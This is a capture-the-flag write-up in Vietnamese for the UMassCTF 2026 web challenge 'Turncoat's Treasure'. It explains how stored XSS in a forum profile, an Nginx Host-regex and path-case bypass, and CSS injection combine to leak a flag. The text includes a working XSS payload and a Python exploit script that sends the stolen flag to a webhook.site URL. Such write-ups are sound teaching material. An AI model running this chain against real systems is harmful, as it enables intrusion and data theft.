---
title: "Turncoat's Treasure"
date: 2026-05-14
platform: "UMassCTF 2026"
category: "Web"
difficulty: "Hidden"
tags: ["web", "umassctf-2026"]
series: "UMassCTF 2026"
draft: false
---

# Turncoat's Treasure
## Challenge Information
- **Category**: Web Exploitation
- **Event**: UMassCTF 2026
- **Author**: atch2203
- **Difficulty**: Hidden
- **Tags**: #web
---
## 1. Description
>After 3 decades of service in the pirate's crew, you have decided that now is a good time to retire. However, you're currently broke, and need a solid fund to live confortably in retirement. Steal the treasure from the captain!
## 2. Overview

## 3. Reconnaissance
Là một web challenge thì trước tiên ta sẽ trải nghiệm các chức năng của trang web trước:

![](./images/Pasted%20image%2020260413185627.png)

Trong phần Enter Pirate Chat cũng chỉ có các chức năng đăng ký và đăng nhập cơ bản:

![](./images/Pasted%20image%2020260413185817.png)

Vì đây là một bài whitebox nên ta sẽ vào xem source luôn để xem đầy đủ các chức năng của web. Ta có Source map các file chính và liên quan đến các lỗ hổng như sau:

```
turncoat_challenge/
├── docker-compose.yml       # Cấu trúc mạng và các services nội bộ
├── .env                     # Biến môi trường
├── proxy/
│   └── nginx.conf           # [LỖ HỔNG 2] File cấu hình proxy chứa lỗi Regex và Case-sensitivity
├── captain/
│   └── src/
│       └── index.ts         # Cấu hình bot Puppeteer và endpoint nội bộ /treasure
├── forum/
│   ├── app.js               # Logic điều khiển forum
│   └── templates/
│       └── user.html        # Render profile {{ p.content | safe }}
├── product/
│   ├── app.js
│   └── templates/...
└── dns/
    └── Corefile             # Cấu hình phân giải tên miền nội bộ Docker
```

Nhìn qua sơ source map thì ta có thể thấy không hết có file `flag.txt` hay dấu hiệu gì của flag. Mình sẽ kiểm tra từng file để biết mục tiêu của challenge ở đâu trước, sau một hồi miệt mài check thì mình đã tìm thấy mục tiêu của chúng ta nằm ngay trong `/captain/src/index.ts` và trong route `/treasure`:

![](./images/Pasted%20image%2020260414024024.png)

Còn để làm sao để lấy thì trước tiên phải hiểu luồng hoạt động của web trước, như thói quen thì mình sẽ kiểm tra các file `Dockerfile`, bài này có tận 5 cái docker =)))

- `/captain/Dockerfile`
- `/dns/Dockerfile`
- `/forum/Dockerfile`
- `/product/Dockerfile`
- `/proxy/Dockerfile`

Check tiếp `docker-compose.yml` để hiểu cách các Docker này giao tiếp và kết nối với nhau, sau một hồi đọc thì mình có các phân tích như sau:

Sơ đồ mạng:

![](./images/Pasted%20image%2020260416030349.png)

Trang web này là hệ thống gồm 5 services chạy trên 5 container: **Proxy**, **DNS**, **Captain**, **Product**, và **Forum**.
- `proxy` (Lối vào):

	![](./images/Pasted%20image%2020260414024935.png)
		
	- Đây là nơi duy nhất tiếp nhận các traffic từ bên ngoài và chuyển tiếp đến các services bên trong. Vì trong source có file `nginx.conf` nên ta biết luôn đây là một Nginx.
	- **Port**: chạy ở port 443.
	- **Networks**: Connect cả 2 mạng là `piratenet` (đuôi ip là .30) và `external`.
	- Depends_on: Chỉ khởi động sau khi các container khác là `product`, `forum`, và `captain` đã chạy.

- `dns`:

	![](./images/Pasted%20image%2020260414024917.png)
	- Đây là 1 server DNS giúp phân giải các tên miền nội bộ
	- **Networks:** Gắn cứng với IP tĩnh `${PIRATENET}.100` trên mạng `piratenet`.
	- **Depends_on:** Chỉ chạy sau khi `proxy` đã khởi động.

- `captain`, `product`, `forum` (Backend Services):

	![](./images/Pasted%20image%2020260414030206.png)
	
	- Đây là các backend chính của hệ thống
	- Các docker này chỉ giao tiếp trong mạng nội bộ `piratenet` (không bị lộ port ra ngoài internet).
	- Riêng `captain` được cấu hình để trỏ DNS resolver trực tiếp về ip của `dns`.

Về Networks thì ta có thể thấy hệ thống chia làm 2 loại (trích Gemini):

- **`piratenet`:** Mạng nội bộ chính của hệ thống. Nó sử dụng IPAM (IP Address Management) để cấp dải mạng tĩnh (Subnet) là `${PIRATENET}.0/24`. Điều này đảm bảo các container như proxy (`.30`) và dns (`.100`) luôn giữ được IP cố định, không bị thay đổi mỗi khi restart.
    
- **`external`:** Định nghĩa một mạng đã có sẵn từ trước (hoặc dùng để giao tiếp với các stack bên ngoài docker-compose này).

Dựa vào sơ đồ mạng như này ta dễ dạng nhận ra mô hình này có lớp phòng thủ bên ngoài (proxy) khá cứng, nhưng bên trong các mạng lại kết nối trực tiếp và tin tưởng lẫn nhau --> Nghĩa là nếu ta có thể tìm cách chui lọt được vào bên trong mạng nội bộ thì có thể truy cập được tùy ý.

Ta sẽ tiếp tục phân tích sâu vào từng module để tìm lỗ hổng.

1. `captain`:
`/src/index.ts`: Backend này được viết bằng Typescript, dễ dàng phát hiện đây là một con Bot tự động dùng thư viện `puppeteer` để điều khiển trình duyệt:

![](./images/Pasted%20image%2020260414124616.png)

Theo gemini: **Bản chất của Puppeteer** không gửi gói tin HTTP đơn thuần như `curl` hay `requests`. Nó **mở hẳn một tab trình duyệt thật**, tự biên dịch mã HTML, tự thực thi Javascript (XSS), tự xử lý chuyển hướng URL (Redirects), tự đồng bộ Cookies, và tự chuẩn hóa đường dẫn mạng giống hệt như một người dùng người thật.

Phân tích sâu hơn hành vi của bot ở `/call-captain`:

![](./images/Pasted%20image%2020260414125813.png)

Và ta cũng dễ dàng nhận ra con bot này ở cùng mạng nội bộ localhost, vì thế ta có thể nhờ nó để lấy flag ở `/treasure` và gửi ra ngoài, nhưng gửi thế nào thì mình sẽ đọc tiếp để tìm hướng đi tiếp theo.

`Dockerfile`: Ở trong file này ta có thể biết được con bot mà ta nói đang dùng trình duyệt Chrome:

![](./images/Pasted%20image%2020260414115842.png)

2. `forum`:

`package.json`: Dựa vào file này, ta có thể biết được con backend này đang dùng Template Engine nunjucks để render và sử dụng isomorphic-dompurify để filter các dữ liệu độc hại. Trông có vẻ khá an toàn =))

![](./images/Pasted%20image%2020260414110116.png)

Nhưng trong file `user.html`, dev lại phản bội lại chính sự an toàn đó (có lẽ là do quên) bằng cách sử dụng `| safe` để in ra nguyên bản HTML mà không hề mã hóa hay có một biện pháp làm sạch nào: 

![](./images/Pasted%20image%2020260414111120.png)

Và ở phía `app.js` cũng không hề có filter gì:

![](./images/Pasted%20image%2020260414111257.png)

--> Nếu ta nhập vào một thẻ `<script>...</script>` và post lên trang này sẽ gây ra **XSS stored**.

--> Đến đây kết hợp với con Bot localhost ở `/captain` thì ta dễ dàng nhận ra giờ ta cần lừa con Bot tới truy cập trang cá nhân của mình để kịch hoạt mã độc và đợi flag về tay là xong. Sử dụng `GET /call-captain?endpoint=/user/hacker` để gọi bot đến.

---

Tuy nhiên điều nan giải ở đây là nếu đứng từ internet, Nginx proxy sẽ chặn hết mọi request gửi đến `captain`, vì thế lại càng không thể gửi đến `/call-captain`, ta có thể xem ở file `nginx.conf`:

![](./images/Pasted%20image%2020260414173926.png)

Nhìn qua ta có thể thấy cấu hình rất chặt và dường như khó có thể chui lọt được qua cái tường này.

Nhưng có một có lẽ dev khá cẩu thả trong các chi tiết nhỏ nên ta có thể bypass như sau:

- (1) so sánh chuỗi tĩnh, không dùng Regex

- (2) biến `$HOST` được đưa thẳng vào Regex mà quên không escape dấu `.`. Do đó dấu chấm ở đây được Regex hiểu là wildcard (bất kỳ ký tự nào cũng đều match).

- (3) Path `/call-captain` bị chặn. Nhược điểm duy nhất là Nginx so sánh khớp từng chữ cái và phân biệt hoa hay thường. Nhưng ExpressJS phía backend thì lại không như thế, nó không phân biệt hoa hay thường.

--> Để bypass được (1) và (2) ta chỉ đơn giản là thay vì viết dấu `.` trong domain như bình thường ta sẽ thay nó bằng một ký tự bất kỳ.

Ví dụ: thay vì ta viết `Host: captain.turncoat.web.ctf.org`, ta sẽ viết `Host: captain.turncoatXweb.ctf.org` (thay dấu `.` thành chữ `X`)

- Lúc này khi nó đi qua (1), vì khối này so sánh tĩnh nên Nginx chỉ thấy `captain.turncoatXweb.ctf.org` không match với  `captain.turncoat.web.ctf.org` nên nó bỏ qua.

- Đến với (2) thì Nginx thấy chữ `X` hoàn toàn khớp với quy tắc dấu `.` --> Nó chấp nhận Request này luôn.

Để bypass được (3) đơn giản là thay vì viết `/call-captain` ta sẽ viết `/Call-captain`

--> Từ các sai sót (1), (2) và (3) phía dev đã mở ra cho ta một cánh cửa để đi vào trong mạng nội bộ và gọi bot.

---

Khi Bot truy cập `forum`, nó bị dính JS Payload của ta. Payload này sẽ khiến Bot tự gọi đến `GET /treasure?name=...`, lúc này response trả về một đoạn file text định dạng CSS như sau:

```
here is your treasure <Biến name> UMASS{flag_secret_here}
```

Nhưng bot sẽ bị vướng chính sách CORS vì Fetch API không cho phép đọc source code cross-origin. Nhưng có một cách rất thông mình là biến nó thành một thuộc tính CSS cho phép truy cập đường link.

Nếu ta viết `<name>:

```js
encodeURIComponent(',body{background:url(https://webhook.site/hacker_server?d=\\');
```

CSS sẽ render thành, nhưng tác giả lại làm khó ta ở dấu space trước flag, nhưng đơn giản là ta chỉ cần escape nó là xong (đó là lý do có `//`):

```css
here is your treasure ,body{background:url(https://webhook.site/hacker_server?d=\ UMASS{flag_secret_here}
```

## 4. Exploitation
Tổng hợp lại ta sẽ có payload như sau:

```js
<script>

let l=document.createElement('link');

l.rel='stylesheet';

l.href='https://localhost/treasure?name=' + encodeURIComponent(',body{{background:url({webhook_url}?d=\\\\');

document.head.appendChild(l);

</script>
```

PoC:

```python
import requests
import random
import string
import urllib.parse
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def main():
    if len(sys.argv) < 3:
        print(f"Usage: python exploit.py <OOB_WEBHOOK_URL> <TARGET_URL>")
        print(f"Example: python exploit.py https://webhook.site/ac4c6037-fcac-49a5-946b-76667cdfbfae https://8ca431d1-25d3-4863-bacc-65c6d041911e.turncoatstreasure.web.ctf.umasscybersec.org/")
        sys.exit(1)
    webhook_url = sys.argv[1]
    target_url = sys.argv[2].rstrip('/')
    # Extract the domain for the Host header bypass
    target_domain = urllib.parse.urlparse(target_url).netloc
    
    # 1. Register a new user
    username = get_random_string()
    password = get_random_string()

    forum_domain = f"forum.{target_domain}"
    forum_url = f"https://{forum_domain}"
    
    print(f"[*] Registering user {username}...")
    session = requests.Session()
    session.verify = False
    reg_url = f"{forum_url}/register"
    res = session.post(reg_url, data={"username": username, "password": password})

    if res.status_code == 200 and "login" not in res.url.lower():
        print("[-] Registration might have failed. Let's try loging in anyway.")

    print(f"[*] Logging in as {username}...")
    log_url = f"{forum_url}/login"
    login_res = session.post(log_url, data={"username": username, "password": password})
 
    if login_res.status_code == 200 and "Invalid" not in login_res.text:
         print("[+] Login looks potentially successful")

    print("[*] Planting XSS payload in profile...")
    post_url = f"{forum_url}/post"
    js_payload = f"""<script>
let l=document.createElement('link');
l.rel='stylesheet';
l.href='https://localhost/treasure?name=' + encodeURIComponent(',body{{background:url({webhook_url}?d=\\\\');
document.head.appendChild(l);
</script>"""

    res = session.post(post_url, data={"content": js_payload})

    profile_url = f"{forum_url}/user/{username}"
    res = session.get(profile_url)
    if "encodeURIComponent" in res.text:
        print("[+] XSS planted successfully on profile!")
    else:
        print("[-] XSS payload not found in profile page...")

    print("[*] Triggering captain bot via SSRF proxy bypass...")

    trigger_endpoint = f"/user/{username}"
    url_to_hit = f"{target_url}/Call-captain?endpoint={trigger_endpoint}"

    malformed_domain = target_domain.replace(".", "X", 1)

    headers = {

        "Host": f"captain.{malformed_domain}"

    }

    try:
        res = requests.get(url_to_hit, headers=headers, verify=False, timeout=10)
        print(f"[+] Bot trigger response: {res.status_code}")
        print(f"    Body: {res.text.strip()}")
        print("\n[SUCCESS] The bot should now be visiting your profile.")
        print(f"[*] Check your webhook at {webhook_url} for the flag!")
        print("[*] Note: Chromium escapes the space, so the URL visited will look like: ?d= UMASS{...}")
    except Exception as e:
        print(f"[-] Error triggering bot: {e}")

if __name__ == "__main__":
    main()
```

>h@ppy h@ck!n9 
>*(BKSEC)*